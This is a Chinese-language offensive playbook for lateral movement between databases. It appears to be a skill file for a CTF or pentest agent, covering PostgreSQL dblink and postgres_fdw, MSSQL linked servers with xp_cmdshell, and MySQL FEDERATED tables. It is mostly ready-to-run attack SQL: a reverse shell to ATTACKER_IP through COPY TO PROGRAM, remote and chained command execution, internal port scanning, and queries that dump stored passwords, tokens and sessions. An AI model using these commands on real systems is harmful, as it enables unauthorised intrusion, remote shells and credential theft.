# 数据库横向移动详解

## 1. PostgreSQL dblink 横向

dblink 是 PostgreSQL 内置扩展，允许从一个 PostgreSQL 实例连接到另一个，执行查询并返回结果。这是数据库横向移动最干净的方式——纯 SQL 操作，不需要操作系统权限。

### 1.1 启用 dblink

```sql
-- 需要 superuser 权限
CREATE EXTENSION IF NOT EXISTS dblink;
```

### 1.2 建立连接并查询

```sql
-- 创建命名连接（持久化，可复用）
SELECT dblink_connect('lateral', 
  'host=10.0.0.2 port=5432 user=postgres password=postgres dbname=postgres sslmode=disable');

-- 执行查询
SELECT * FROM dblink('lateral', 'SELECT version()') AS t(result TEXT);

-- 列出数据库
SELECT * FROM dblink('lateral', 'SELECT datname FROM pg_database') AS t(dbname TEXT);

-- 列出表
SELECT * FROM dblink('lateral', 
  'SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN (''pg_catalog'',''information_schema'')'
) AS t(schema TEXT, name TEXT);

-- 读取数据
SELECT * FROM dblink('lateral', 'SELECT * FROM users') AS t(id INT, username TEXT, password TEXT);

-- 搜索 flag
SELECT * FROM dblink('lateral', 'SELECT tablename FROM pg_tables WHERE tablename LIKE ''%flag%''') AS t(name TEXT);
```

### 1.3 异步查询（适合大量数据）

```sql
-- 发送异步查询
SELECT dblink_send_query('lateral', 'SELECT * FROM large_table');

-- 检查是否完成
SELECT dblink_is_busy('lateral');  -- 0 = 完成

-- 获取结果
SELECT * FROM dblink_get_result('lateral') AS t(col1 TEXT, col2 TEXT);
```

### 1.4 跨库执行命令（如果目标也是 superuser）

```sql
-- 在远程 PostgreSQL 上执行系统命令
SELECT * FROM dblink('lateral', 
  $$CREATE TABLE IF NOT EXISTS cmd_out(output TEXT);
    COPY cmd_out FROM PROGRAM 'id';
    SELECT output FROM cmd_out$$
) AS t(output TEXT);

-- 反弹 shell
SELECT dblink_exec('lateral',
  $$COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'$$);
```

### 1.5 断开连接

```sql
SELECT dblink_disconnect('lateral');
```

### 1.6 一次性查询（不需要命名连接）

```sql
-- 直接在查询中指定连接串
SELECT * FROM dblink(
  'host=10.0.0.2 port=5432 user=postgres password=postgres dbname=postgres',
  'SELECT version()'
) AS t(ver TEXT);
```

---

## 2. PostgreSQL postgres_fdw 横向

postgres_fdw（Foreign Data Wrapper）比 dblink 更正式——创建外部表后可以像访问本地表一样查询远程数据。

```sql
-- 安装扩展
CREATE EXTENSION IF NOT EXISTS postgres_fdw;

-- 创建外部服务器
CREATE SERVER remote_db FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '10.0.0.2', port '5432', dbname 'postgres');

-- 创建用户映射
CREATE USER MAPPING FOR CURRENT_USER SERVER remote_db
  OPTIONS (user 'postgres', password 'postgres');

-- 导入远程表结构
IMPORT FOREIGN SCHEMA public FROM SERVER remote_db INTO local_schema;

-- 现在可以直接查询
SELECT * FROM local_schema.users;
SELECT * FROM local_schema.secrets;
```

---

## 3. PostgreSQL SSRF（内网探测）

即使 dblink 无法连接远程数据库（对方不是 PostgreSQL 或端口不对），连接尝试本身也有价值——可以探测内网端口。

```sql
-- 端口扫描：通过连接超时判断端口是否开放
-- 开放端口：快速返回连接错误
-- 关闭端口：等待超时

SELECT dblink_connect('probe',
  'host=10.0.0.1 port=80 user=x password=x dbname=x connect_timeout=3');
-- 快速返回错误 → 端口开放
-- 超时 → 端口关闭

-- 批量扫描
DO $$
DECLARE
  port INT;
  ports INT[] := ARRAY[22,80,443,3306,5432,6379,8080,8443,9200];
BEGIN
  FOREACH port IN ARRAY ports LOOP
    BEGIN
      PERFORM dblink_connect('probe_' || port,
        format('host=10.0.0.1 port=%s user=x password=x dbname=x connect_timeout=2', port));
    EXCEPTION WHEN OTHERS THEN
      RAISE NOTICE 'Port %: %', port, SQLERRM;
    END;
  END LOOP;
END $$;
```

---

## 4. MSSQL Linked Server 横向

MSSQL 的 Linked Server 功能原生支持连接其他 MSSQL 实例，甚至可以通过 OLE DB 连接其他类型的数据源。

### 4.1 枚举现有 Linked Server

```sql
-- 列出所有 Linked Server
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;

-- 查看权限
EXEC sp_helplinkedsrvlogin;
```

### 4.2 通过现有 Linked Server 查询

```sql
-- 查询远程数据
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@servername');
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT name FROM sys.databases');

-- 或使用四部分名称
SELECT * FROM [LINKED_SERVER_NAME].master.dbo.sysdatabases;
```

### 4.3 创建新的 Linked Server

```sql
-- 添加 Linked Server
EXEC sp_addlinkedserver 
  @server='REMOTE', 
  @srvproduct='',
  @provider='SQLNCLI', 
  @datasrc='10.0.0.2';

-- 配置登录凭据
EXEC sp_addlinkedsrvlogin 
  @rmtsrvname='REMOTE',
  @useself='false',
  @rmtuser='sa',
  @rmtpassword='password123';

-- 允许 RPC（远程过程调用，用于执行 xp_cmdshell）
EXEC sp_serveroption @server='REMOTE', @optname='rpc out', @optvalue='true';

-- 在远程服务器执行命令
EXEC ('xp_cmdshell ''whoami''') AT [REMOTE];
EXEC ('xp_cmdshell ''type C:\flag.txt''') AT [REMOTE];
```

### 4.4 OPENROWSET 即席查询（无需配置 Linked Server）

```sql
-- 直接连接远程 MSSQL
SELECT * FROM OPENROWSET('SQLNCLI', 
  'Server=10.0.0.2;Uid=sa;Pwd=password;', 
  'SELECT @@servername');

-- 需要启用 Ad Hoc Distributed Queries
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
```

### 4.5 链式横向（A→B→C）

```sql
-- 从 A 通过 B 访问 C
SELECT * FROM OPENQUERY([SERVER_B], 
  'SELECT * FROM OPENQUERY([SERVER_C], ''SELECT @@servername'')');

-- 或嵌套执行
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER_C]') AT [SERVER_B];
```

---

## 5. MySQL FEDERATED 引擎横向

MySQL 的 FEDERATED 存储引擎允许访问远程 MySQL 实例的表。

```sql
-- 检查是否启用
SHOW ENGINES;
-- 如果 FEDERATED 的 Support 是 NO，需要在 my.cnf 中启用

-- 创建 FEDERATED 表
CREATE TABLE remote_users (
  id INT,
  username VARCHAR(100),
  password VARCHAR(100)
) ENGINE=FEDERATED
CONNECTION='mysql://root:password@10.0.0.2:3306/app/users';

-- 查询远程数据
SELECT * FROM remote_users;
```

---

## 6. 通用：利用数据库存储的凭据

所有数据库都可能存储其他服务的凭据：

```sql
-- 搜索包含密码的列
SELECT table_name, column_name FROM information_schema.columns 
WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%secret%' 
   OR column_name ILIKE '%token%' OR column_name ILIKE '%key%';

-- 常见配置表
SELECT * FROM config;
SELECT * FROM settings;
SELECT * FROM sys_config;
SELECT * FROM app_config;

-- Django/Flask 等框架的数据库连接配置
-- 通常在 auth_user 表中存储用户密码 hash
SELECT * FROM auth_user;
SELECT * FROM django_session;
```

获取到新凭据后，回到 `database-exploit` 技能利用它们连接新目标。
